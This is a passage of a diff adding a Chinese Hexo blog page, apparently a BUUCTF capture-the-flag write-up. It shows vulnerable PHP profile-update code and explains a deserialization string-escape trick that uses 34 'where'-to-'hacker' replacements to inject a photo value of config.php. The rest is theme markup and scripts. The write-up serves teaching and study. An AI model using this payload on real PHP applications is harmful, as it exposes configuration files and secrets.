+        if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
+            die(&#39;Invalid nickname&#39;);
+
+        $file = $_FILES[&#39;photo&#39;];
+        if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)
+            die(&#39;Photo size error&#39;);
+
+        move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]));
+        $profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];
+        $profile[&#39;email&#39;] = $_POST[&#39;email&#39;];
+        $profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];
+        $profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);
+
+        $user-&gt;update_profile($username, serialize($profile));
+        echo &#39;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#39;;
+    }
+    else {
+?&gt;</code></pre>
+<p>我们知道原始的字符串为</p>
+<pre><code class="php">a:4:{s:5:&quot;phone&quot;;s:11:&quot;66666666666&quot;;s:5:&quot;email&quot;;s:10:&quot;111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;kendo&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/f3ccdd27d2000e3f9255a7e3e2c48800&quot;;}
+
+我们需要想办法把后面的东西挤出去
+a:4:{s:5:&quot;phone&quot;;s:11:&quot;66666666666&quot;;s:5:&quot;email&quot;;s:10:&quot;111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;kendo&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}s:39:&quot;upload/f3ccdd27d2000e3f9255a7e3e2c48800&quot;;}
+
+我们要逃逸的部分为&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}
+ 我们让nickname[]有34个where，最后会被换成34个hacker，往后加了34个长度，那么反序列化读取的时候,就少读取了34个，正好到 &quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}
+</code></pre>
+
+        </div>
+        <!-- .entry-content -->
+        
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/zfbqr.png"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/wechatqr.png"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+          
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2020/05/28/BUUCTF-%E4%BA%8C/" rel="prev">
+              <div class="background">
+<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/29.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/29.jpg">-->
+                
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/29.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                BUUCTF(二)</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/2020/05/28/WEB%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="next">
+              <div class="background">
+                
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/36.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                WEB之数据库</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="https://ther.wang" target="_blank" rel="noopener" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg" itemprop="image" alt="T1h2er3" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="https://ther.wang" target="_blank" itemprop="url" rel="author noopener">T1h2er3</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 T1h2er3<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+    <div class="site-info">
+        <div class="footertext">
+            <div class="img-preload">
+                <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+                <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+            </div>
+            
+                <p id="chakhsu"></p>
+            
+            <p>本站总访问量：<a id="allcount"></a></p>
+            <p style="color: #666666;">到底啦！</p>
+            
+                <p id="momk" style="font-family: 'Ubuntu', sans-serif;color: #b9b9b9;"></p>
+            
+        </div>
+        <div class="footer-device">
+            <p style="font-family: 'Ubuntu', sans-serif;">
+ <span style="">Theme <a href="https://github.com/xbclub/Hexo-theme-sakura" target="_blank"
+                         style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i
+             class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a
+             href="https://2heng.xin/" target="_blank"
+             style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a
+             href="https://www.hojun.cn/" target="_blank"
+             style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>&<a
+             href="https://42cloud.cn/" target="_blank"
+             style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">42team, Powered by Hexo</a>
+        </span>
+            </p>
+        </div>
+    </div><!-- .site-info -->
+</footer>
+
+
+<!--<script src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.7/js/tocbot.min.js"></script>-->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/InsightSearch.js"></script>
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/zoom.min.js"></script>
+
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@1.4/js/sakura-app.js"></script>
+
+<script src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/Valine.min.js'></script>
+<script src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+
+      
+       <script>
+  fetch('https://counts.42cloud.cn/api/counts.html')
+        .then(response => response.json())
+        .then(data => {
+              if (document.getElementById("readcount")) {
+                document.getElementById("readcount").innerHTML=data.Count;
+            }
+            if (document.getElementById("allcount")){
+                document.getElementById("allcount").innerHTML=data.Allcount;
+            }
+        })
+        .catch(err => console.error(err))
+</script>
+      
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+    /* <![CDATA[ */
+    if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+        var Poi = {
+            "pjax": "1",
+            "movies": {"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2", "name": "Unbroken.mp4", "live": "close"},
+            "windowheight": "fixed",
+            "codelamp": "close",
+            "ajaxurl": "",
+            "order": "asc",
+            "formpostion": "bottom"
+        };
+    } else {
+        var Poi = {
+            "pjax": "1",
+            "movies": {"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2", "name": "Unbroken.mp4", "live": "open"},
+            "windowheight": "auto",
+            "codelamp": "close",
+            "ajaxurl": "",
+            "order": "asc",
+            "formpostion": "bottom"
+        };
+    }
+    /* ]]> */
+
+</script>
+<script>
+    $(document).ready(function () {
+        if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+            if ($(".pattern-center").length > 0) { //有图的情况
+                tocbot.init({
+                    // Where to render the table of contents.
+                    tocSelector: '.toc', // 放置目录的容器
+                    // Where to grab the headings to build the table of contents.
+                    contentSelector: '.entry-content', // 正文内容所在
+                    // Which headings to grab inside of the contentSelector element.
+                    scrollSmooth: true,
+                    headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+                    headingsOffset: -400,
+                    scrollSmoothOffset: -85
+                });
+            } else {
+                tocbot.init({
+                    // Where to render the table of contents.
+                    tocSelector: '.toc', // 放置目录的容器
+                    // Where to grab the headings to build the table of contents.
+                    contentSelector: '.entry-content', // 正文内容所在
+                    // Which headings to grab inside of the contentSelector element.
+                    scrollSmooth: true,
+                    headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+                    headingsOffset: -85,
+                    scrollSmoothOffset: -85
+                });
+            }
+            var offsetTop = $('.toc').offset().top - 95;
+            window.onscroll = function () {
+                var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+                if (scrollTop >= offsetTop) {
+                    $('.toc').addClass('toc-fixed');
+                } else {
+                    $('.toc').removeClass('toc-fixed');
+                }
+            }
+        }
+    });
+</script>
+
+    <script type="text/javascript">
+        function NewDate(str) {
+            str = str.split('-');
+            var date = new Date();
+            date.setUTCFullYear(str[0], str[1] - 1, str[2]);
+            date.setUTCHours(0, 0, 0, 0);
+            return date;
+        }
+
+        function momxc() {
+            var birthDay = NewDate("2019-6-16");
+            var today = new Date();
+            var timeold = today.getTime() - birthDay.getTime();
+            var sectimeold = timeold / 1000
+            var secondsold = Math.floor(sectimeold);
+            var msPerDay = 24 * 60 * 60 * 1000;
+            var e_daysold = timeold / msPerDay;
+            var daysold = Math.floor(e_daysold);
+            var e_hrsold = (daysold - e_daysold) * -24;
+            var hrsold = Math.floor(e_hrsold);
+            var e_minsold = (hrsold - e_hrsold) * -60;
+            var minsold = Math.floor((hrsold - e_hrsold) * -60);
+            var seconds = Math.floor((minsold - e_minsold) * -60).toString();
+            document.getElementById("momk").innerHTML = "本站已安全运行" + daysold + "天" + hrsold + "小时" + minsold + "分" + seconds + "秒";
+            setTimeout(momxc, 1000);
+        }
+
+        momxc();
+    </script>
+
+
+
+    <script type="text/javascript">
+        fetch('https://v1.hitokoto.cn')
+            .then(response => response.json())
+            .then(data => {
+                chakhsu(document.getElementById("chakhsu"), data.hitokoto);
+            })
+            .catch(err => console.error(err));
+
+
+        // 文字循环处理 两个参数，第一个是需要显示在哪个标签内append 以id为选择器，第二个参数是 要处理的文字
+        function chakhsu(r, text) {
+            function t() {
+                return b[Math.floor(Math.random() * b.length)];
+            }
+
+            function e() {
+                return String.fromCharCode(94 * Math.random() + 33);
+            }
+
+            function n(r) {
+                for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+                    var l = document.createElement("span");
+                    (l.textContent = e()), (l.style.color = t()), n.appendChild(l);
+                }
+                return n;
+            }
+
+            function i() {
+                var t = o[c.skillI];
+                c.step
+                    ? c.step--
+                    : ((c.step = g),
+                        c.prefixP < l.length
+                            ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++)
+                            : "forward" === c.direction
+                            ? c.skillP < t.length
+                                ? ((c.text += t[c.skillP]), c.skillP++)
+                                : c.delay
+                                    ? c.delay--
+                                    : ((c.direction = "backward"), (c.delay = a))
+                            : c.skillP > 0
+                                ? ((c.text = c.text.slice(0, -1)), c.skillP--)
+                                : ((c.skillI = (c.skillI + 1) % o.length),
+                                    (c.direction = "forward"))),
+                    (r.textContent = c.text),
+                    r.appendChild(
+                        n(
+                            c.prefixP < l.length
+                                ? Math.min(s, s + c.prefixP)
+                                : Math.min(s, t.length - c.skillP)
+                        )
+                    ),
+                    setTimeout(i, d);
+            }
+
+            /*以下内容自定义修改*/
+            var l = "",
+                o = [text].map(function (r) {
+                    return r + "";
+                }),
+                a = 3,
+                g = 1,
+                s = 5,
+                d = 75,
+                b = [
+                    "rgb(110,64,170)",
+                    "rgb(150,61,179)",
+                    "rgb(191,60,175)",
+                    "rgb(228,65,157)",
+                    "rgb(254,75,131)",
+                    "rgb(255,94,99)",
+                    "rgb(255,120,71)",
+                    "rgb(251,150,51)",
+                    "rgb(226,183,47)",
+                    "rgb(198,214,60)",
+                    "rgb(175,240,91)",
+                    "rgb(127,246,88)",
+                    "rgb(82,246,103)",
+                    "rgb(48,239,130)",
+                    "rgb(29,223,163)",
+                    "rgb(26,199,194)",
+                    "rgb(35,171,216)",
+                    "rgb(54,140,225)",
+                    "rgb(76,110,219)",
+                    "rgb(96,84,200)"
+                ],
+                c = {
+                    text: "",
+                    prefixP: -s,
+                    skillI: 0,
+                    skillP: 0,
+                    direction: "forward",
+                    delay: a,
+                    step: g
+                };
+            i();
+        }
+    </script>
+
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/yremp/live2d@1.0/autoload.js"></script>
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">T1h2er3</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="http://github.com/t1h2er3" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+        <a href="https://wpa.qq.com/msgrd?v=3&uin=1078340014&site=qq&menu=yes" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            文章分类
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/comment/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+            兴趣
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/music/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  音乐
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    switch="true"
+
+    id="2660651585"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+  
+  <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
+</body>
+</html>
